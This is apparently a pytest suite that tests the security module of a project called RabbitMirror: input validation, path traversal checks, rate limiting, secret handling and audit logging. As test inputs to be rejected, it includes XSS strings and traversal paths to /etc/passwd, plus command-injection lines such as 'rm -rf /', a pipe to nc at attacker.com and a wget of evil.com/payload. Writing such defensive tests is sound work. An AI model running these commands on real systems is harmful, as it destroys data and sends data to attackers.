#!/usr/bin/env python3

"""
Comprehensive security tests for RabbitMirror.

Tests cover:
- Input validation and sanitization
- Path traversal protection
- File upload security
- Rate limiting
- Authentication mechanisms
- XSS/injection prevention
- Error handling security
"""

import os
import tempfile
import time
from pathlib import Path
from unittest.mock import Mock, patch

import pytest

from rabbitmirror.exceptions import SecurityError, ValidationError
from rabbitmirror.security import (
    InputValidator,
    RateLimiter,
    SecurityAuditor,
    SecurityConfig,
)

try:
    from rabbitmirror.security import SecretManager

    SECRET_MANAGER_AVAILABLE = True
except ImportError:
    SECRET_MANAGER_AVAILABLE = False


class TestSecurityConfig:
    """Test security configuration."""

    def test_default_config(self):
        """Test default security configuration values."""
        config = SecurityConfig()

        assert config.rate_limit_requests == 100
        assert config.rate_limit_window == 3600
        assert config.max_file_size == 104857600  # 100MB
        assert "json" in config.allowed_extensions
        assert "exe" in config.blocked_extensions
        assert config.max_string_length == 10000
        assert config.secret_key_min_length == 32

    def test_environment_override(self):
        """Test environment variable overrides."""
        with patch.dict(
            os.environ, {"RATE_LIMIT_REQUESTS": "50", "MAX_FILE_SIZE": "50000000"}
        ):
            config = SecurityConfig()
            assert config.rate_limit_requests == 50
            assert config.max_file_size == 50000000


class TestInputValidator:
    """Test input validation and sanitization."""

    def setup_method(self):
        """Set up test fixtures."""
        self.config = SecurityConfig()
        self.validator = InputValidator(self.config)

    def test_valid_string(self):
        """Test validation of safe strings."""
        valid_input = "This is a safe string with 123 numbers"
        result = self.validator.validate_string(valid_input)
        assert result == valid_input

    def test_dangerous_script_tag(self):
        """Test detection of script tags."""
        dangerous_input = "<script>alert('xss')</script>"

        with pytest.raises(SecurityError) as exc_info:
            self.validator.validate_string(dangerous_input)

        assert "Potentially dangerous content detected" in str(exc_info.value)
        assert exc_info.value.error_code == "DANGEROUS_CONTENT"

    def test_javascript_url(self):
        """Test detection of JavaScript URLs."""
        dangerous_input = "javascript:alert('xss')"

        with pytest.raises(SecurityError):
            self.validator.validate_string(dangerous_input)

    def test_eval_detection(self):
        """Test detection of eval statements."""
        dangerous_input = "eval('malicious code')"

        with pytest.raises(SecurityError):
            self.validator.validate_string(dangerous_input)

    def test_path_traversal_detection(self):
        """Test detection of path traversal attempts."""
        dangerous_inputs = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "file/../../secret",
        ]

        for dangerous_input in dangerous_inputs:
            with pytest.raises(SecurityError):
                self.validator.validate_string(dangerous_input)

    def test_command_injection_detection(self):
        """Test detection of command injection characters."""
        dangerous_inputs = [
            "file.txt; rm -rf /",
            "data | nc attacker.com 4444",
            "input && wget evil.com/payload",
            "test `whoami`",
        ]

        for dangerous_input in dangerous_inputs:
            with pytest.raises(SecurityError):
                self.validator.validate_string(dangerous_input)

    def test_string_length_validation(self):
        """Test string length limits."""
        long_string = "a" * (self.config.max_string_length + 1)

        with pytest.raises(ValidationError) as exc_info:
            self.validator.validate_string(long_string)

        assert "exceeds maximum length" in str(exc_info.value)

    def test_control_character_removal(self):
        """Test removal of control characters."""
        input_with_controls = "test\x00\x08\x1F\x7Fstring"
        result = self.validator.validate_string(input_with_controls)
        assert result == "teststring"

    def test_filename_validation_safe(self):
        """Test validation of safe filenames."""
        safe_filenames = [
            "document.pdf",
            "data_2023.json",
            "history.html",
            "results.csv",
        ]

        for filename in safe_filenames:
            result = self.validator.validate_filename(filename)
            assert result.endswith(filename.split(".")[-1])

    def test_filename_validation_dangerous(self):
        """Test rejection of dangerous filenames."""
        dangerous_filenames = ["malware.exe", "script.js", "shell.sh", "virus.bat"]

        for filename in dangerous_filenames:
            with pytest.raises(SecurityError):
                self.validator.validate_filename(filename)

    def test_filename_validation_unsupported(self):
        """Test rejection of unsupported file extensions."""
        with pytest.raises(ValidationError):
            self.validator.validate_filename("document.xyz")

    def test_filename_sanitization(self):
        """Test filename sanitization."""
        dangerous_filename = "../../../file with spaces & symbols!.json"

        # This should raise a SecurityError due to path traversal detection
        with pytest.raises(SecurityError):
            self.validator.validate_filename(dangerous_filename)

        # Test safe filename sanitization
        safe_filename = "file with spaces & symbols!.json"
        result = self.validator.validate_filename(safe_filename)
        assert result.endswith(".json")
        assert ".." not in result

    def test_path_validation_safe(self):
        """Test validation of safe file paths."""
        with tempfile.TemporaryDirectory() as tmpdir:
            safe_path = os.path.join(tmpdir, "safe_file.txt")
            Path(safe_path).touch()

            result = self.validator.validate_path(safe_path)
            assert isinstance(result, Path)

    def test_path_validation_traversal(self):
        """Test rejection of path traversal attempts."""
        dangerous_paths = ["../../../etc/passwd", "/etc/shadow", "/usr/bin/dangerous"]

        for path in dangerous_paths:
            with pytest.raises(SecurityError):
                self.validator.validate_path(path)

    def test_json_validation_safe(self):
        """Test validation of safe JSON data."""
        safe_data = {"name": "test", "values": [1, 2, 3], "nested": {"key": "value"}}

        result = self.validator.validate_json_data(safe_data)
        assert result == safe_data

    def test_json_validation_deep_nesting(self):
        """Test rejection of deeply nested JSON."""
        # Create deeply nested structure
        deep_data = {}
        current = deep_data
        for i in range(15):  # Exceeds max_nesting_depth
            current["nested"] = {}
            current = current["nested"]

        with pytest.raises(ValidationError) as exc_info:
            self.validator.validate_json_data(deep_data)

        assert "nesting exceeds maximum depth" in str(exc_info.value)

    def test_json_validation_large_array(self):
        """Test rejection of oversized arrays."""
        large_array = list(range(self.config.max_array_length + 1))

        with pytest.raises(ValidationError) as exc_info:
            self.validator.validate_json_data(large_array)

        assert "Array size exceeds maximum" in str(exc_info.value)


class TestRateLimiter:
    """Test rate limiting functionality."""

    def setup_method(self):
        """Set up test fixtures."""
        self.config = SecurityConfig()
        self.config.rate_limit_requests = 5
        self.config.rate_limit_window = 10  # 10 seconds for testing
        self.rate_limiter = RateLimiter(self.config)

    def test_rate_limit_allowed(self):
        """Test that requests within limit are allowed."""
        identifier = "test_user"

        for i in range(self.config.rate_limit_requests):
            assert self.rate_limiter.is_allowed(identifier) is True

    def test_rate_limit_exceeded(self):
        """Test that requests exceeding limit are blocked."""
        identifier = "test_user"

        # Use up the allowed requests
        for i in range(self.config.rate_limit_requests):
            self.rate_limiter.is_allowed(identifier)

        # Next request should be blocked
        assert self.rate_limiter.is_allowed(identifier) is False

    def test_rate_limit_window_reset(self):
        """Test that rate limit resets after time window."""
        identifier = "test_user"

        # Mock time from the beginning to avoid mixing real and mock timestamps
        with patch("rabbitmirror.security.time.time") as mock_time:
            # Start with a fixed time
            start_time = 1000000.0
            mock_time.return_value = start_time

            # Use up allowed requests
            for i in range(self.config.rate_limit_requests):
                self.rate_limiter.is_allowed(identifier)

            # Verify rate limit is exceeded
            assert self.rate_limiter.is_allowed(identifier) is False

            # Simulate time passing beyond the window
            future_time = start_time + self.config.rate_limit_window + 1
            mock_time.return_value = future_time

            # Should now be allowed again
            assert self.rate_limiter.is_allowed(identifier) is True

    def test_remaining_requests(self):
        """Test remaining request calculation."""
        identifier = "test_user"

        # Initially should have full limit
        remaining = self.rate_limiter.get_remaining_requests(identifier)
        assert remaining == self.config.rate_limit_requests

        # Use one request
        self.rate_limiter.is_allowed(identifier)

        remaining = self.rate_limiter.get_remaining_requests(identifier)
        assert remaining == self.config.rate_limit_requests - 1


@pytest.mark.skipif(
    not SECRET_MANAGER_AVAILABLE,
    reason="SecretManager not available in simplified architecture",
)
class TestSecretManager:
    """Test secret and credential management."""

    def setup_method(self):
        """Set up test fixtures."""
        self.config = SecurityConfig()
        self.secret_manager = SecretManager(self.config)

    def test_generate_secret_key(self):
        """Test secret key generation."""
        key = self.secret_manager.generate_secret_key()

        assert len(key) >= self.config.secret_key_min_length
        assert isinstance(key, str)

        # Should be URL-safe base64
        import base64

        try:
            base64.urlsafe_b64decode(key + "==")  # Add padding
        except Exception:
            pytest.fail("Generated key is not valid URL-safe base64")

    def test_generate_custom_length_key(self):
        """Test secret key generation with custom length."""
        custom_length = 64
        key = self.secret_manager.generate_secret_key(custom_length)

        # URL-safe base64 encoding increases length, so check decoded length
        import base64

        decoded_bytes = base64.urlsafe_b64decode(key + "==")
        assert len(decoded_bytes) >= custom_length * 3 // 4  # Approximate for base64

    def test_validate_secret_key_strong(self):
        """Test validation of strong secret keys."""
        strong_key = self.secret_manager.generate_secret_key()
        assert self.secret_manager.validate_secret_key(strong_key) is True

    def test_validate_secret_key_weak(self):
        """Test rejection of weak secret keys."""
        weak_keys = [
            "password123",
            "abc123",
            "qwerty",
            "admin",
            "secret",
            "short",  # Too short
        ]

        for weak_key in weak_keys:
            assert self.secret_manager.validate_secret_key(weak_key) is False

    def test_hash_secret(self):
        """Test secret hashing."""
        secret = "my_secret_password"
        hashed, salt = self.secret_manager.hash_secret(secret)

        assert isinstance(hashed, str)
        assert isinstance(salt, str)
        assert len(hashed) > 0
        assert len(salt) > 0
        assert hashed != secret

    def test_verify_secret_correct(self):
        """Test secret verification with correct secret."""
        secret = "my_secret_password"
        hashed, salt = self.secret_manager.hash_secret(secret)

        assert self.secret_manager.verify_secret(secret, hashed, salt) is True

    def test_verify_secret_incorrect(self):
        """Test secret verification with incorrect secret."""
        secret = "my_secret_password"
        wrong_secret = "wrong_password"
        hashed, salt = self.secret_manager.hash_secret(secret)

        assert self.secret_manager.verify_secret(wrong_secret, hashed, salt) is False

    def test_mask_secret(self):
        """Test secret masking for display."""
        secret = "very_long_secret_key_for_testing"
        masked = self.secret_manager.mask_secret(secret)

        assert masked.startswith(secret[:4])
        assert masked.endswith(secret[-4:])
        assert "*" in masked
        assert len(masked) == len(secret)

    def test_mask_short_secret(self):
        """Test masking of short secrets."""
        short_secret = "abc"
        masked = self.secret_manager.mask_secret(short_secret)

        assert masked == "***"


class TestSecurityAuditor:
    """Test security auditing and logging."""

    def setup_method(self):
        """Set up test fixtures."""
        self.config = SecurityConfig()
        self.auditor = SecurityAuditor(self.config)

    def test_log_security_event(self):
        """Test logging of security events."""
        event_type = "test_violation"
        details = {"user": "test_user", "action": "suspicious_activity"}

        self.auditor.log_security_event(event_type, details)

        assert len(self.auditor.security_events) == 1
        event = self.auditor.security_events[0]

        assert event["event_type"] == event_type
        assert event["details"] == details
        assert "timestamp" in event
        assert "severity" in event

    def test_event_severity_classification(self):
        """Test proper classification of event severities."""
        # High severity events
        high_severity_events = [
            "path_traversal",
            "code_injection",
            "rate_limit_exceeded",
        ]
        for event_type in high_severity_events:
            self.auditor.log_security_event(event_type, {})
            assert self.auditor.security_events[-1]["severity"] == "HIGH"

        # Medium severity events
        medium_severity_events = ["invalid_file_type", "suspicious_input"]
        for event_type in medium_severity_events:
            self.auditor.log_security_event(event_type, {})
            assert self.auditor.security_events[-1]["severity"] == "MEDIUM"

        # Low severity (default)
        self.auditor.log_security_event("info_event", {})
        assert self.auditor.security_events[-1]["severity"] == "LOW"

    def test_security_report_generation(self):
        """Test generation of security reports."""
        # Log some test events
        self.auditor.log_security_event("rate_limit_exceeded", {"user": "test1"})
        self.auditor.log_security_event("invalid_file_type", {"file": "test.exe"})
        self.auditor.log_security_event("info_event", {"info": "test"})

        report = self.auditor.get_security_report()

        assert "report_timestamp" in report
        assert "total_events_24h" in report
        assert report["total_events_24h"] == 3
        assert "severity_breakdown" in report
        assert "event_type_breakdown" in report

        # Check severity breakdown
        assert report["severity_breakdown"]["HIGH"] == 1
        assert report["severity_breakdown"]["MEDIUM"] == 1
        assert report["severity_breakdown"]["LOW"] == 1


class TestSecurityIntegration:
    """Integration tests for security components."""

    def test_file_upload_security_pipeline(self):
        """Test complete file upload security pipeline."""
        config = SecurityConfig()
        validator = InputValidator(config)
        auditor = SecurityAuditor(config)

        # Test malicious filename
        malicious_filename = "../../../etc/passwd.txt"

        with pytest.raises(SecurityError):
            validator.validate_filename(malicious_filename)

        # Test oversized content simulation
        large_content = {"data": "x" * (config.max_string_length + 1)}

        with pytest.raises(ValidationError):
            validator.validate_json_data(large_content)

    def test_rate_limiting_integration(self):
        """Test rate limiting with different scenarios."""
        config = SecurityConfig()
        config.rate_limit_requests = 3
        rate_limiter = RateLimiter(config)

        # Different users should have separate limits
        assert rate_limiter.is_allowed("user1") is True
        assert rate_limiter.is_allowed("user2") is True

        # Exhaust user1's limit
        for i in range(2):  # Already used 1
            rate_limiter.is_allowed("user1")

        # user1 should be blocked, user2 should still work
        assert rate_limiter.is_allowed("user1") is False
        assert rate_limiter.is_allowed("user2") is True

    @pytest.mark.skipif(
        not SECRET_MANAGER_AVAILABLE,
        reason="SecretManager not available in simplified architecture",
    )
    @patch("rabbitmirror.security.secrets.token_urlsafe")
    def test_secret_generation_randomness(self, mock_token):
        """Test that secret generation uses cryptographically secure randomness."""
        mock_token.return_value = "mocked_secure_token"

        config = SecurityConfig()
        secret_manager = SecretManager(config)

        key = secret_manager.generate_secret_key()

        mock_token.assert_called_once()
        assert key == "mocked_secure_token"


# Performance and load testing
class TestSecurityPerformance:
    """Test security component performance under load."""

    def test_input_validation_performance(self):
        """Test input validation performance with various input sizes."""
        config = SecurityConfig()
        validator = InputValidator(config)

        # Test with different input sizes
        test_sizes = [100, 1000, 5000]

        for size in test_sizes:
            test_input = "a" * size
            start_time = time.time()

            try:
                validator.validate_string(test_input)
                duration = time.time() - start_time

                # Validation should complete quickly (< 0.1 seconds for normal inputs)
                assert (
                    duration < 0.1
                ), f"Validation took too long for size {size}: {duration}s"

            except ValidationError:
                # Expected for inputs exceeding limits
                pass

    def test_rate_limiter_performance(self):
        """Test rate limiter performance with many requests."""
        config = SecurityConfig()
        config.rate_limit_requests = 1000
        rate_limiter = RateLimiter(config)

        # Test with many rapid requests
        start_time = time.time()

        for i in range(100):
            rate_limiter.is_allowed(f"user_{i % 10}")  # 10 different users

        duration = time.time() - start_time

        # Should handle 100 requests quickly
        assert duration < 1.0, f"Rate limiting took too long: {duration}s"


if __name__ == "__main__":
    pytest.main([__file__])
